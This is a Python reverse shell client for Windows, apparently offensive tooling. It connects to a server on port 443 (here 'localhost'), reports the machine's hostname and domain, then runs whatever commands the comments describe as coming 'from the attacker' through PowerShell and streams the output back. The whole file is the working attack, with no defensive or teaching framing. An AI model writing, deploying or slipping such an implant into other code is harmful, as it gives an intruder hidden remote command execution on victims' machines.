import os
import socket
import struct
import subprocess

# Define the IP address to connect to
host = "localhost"
# Define the connection port
port = 443

try:

    # Create a socket object
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # Connect to the server
    s.connect((host,port))
    print("Connected to the server...\n")

    while True:
        # Get current hostname and current working directory to display in the prompt
        cwd = os.getcwd()
        hostname = os.environ["COMPUTERNAME"] + "@" + os.environ["USERDOMAIN"]
        prompt = "({}) - [{}]".format(hostname, cwd)
        # Send the prompt to the server
        s.send(prompt.encode())

        # Receive the command from the attacker
        buffer_data = s.recv(1024)
        # set the size of the data to be sent
        bytes_size = int(buffer_data.decode())
        # Receive data from the server
        data = s.recv(bytes_size)
        # If the data is empty, break out of the loop
        if data == "":
            break
        # if the data contains cd, change the directory
        if data[:2].decode() == "cd":
            try:
                os.chdir(data[3:].decode())
                continue
            except:
                continue
        try:
            # If the data is not empty, run the command
            proc = subprocess.Popen(["powershell", "-Command", data.decode()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # Read the output
            stdout_value = proc.stdout.read() + proc.stderr.read()
        except Exception as e:
            # If there is an error, send the error message
            stdout_value = "Error: " + str(e)
        # Send the output to the attacker
        bytes_size = struct.calcsize("{}s".format(len(stdout_value)))
        s.send(str(bytes_size).encode())
        s.send(stdout_value)
except Exception as e:
    print("Error occured: ", str(e))
finally:
    s.close()

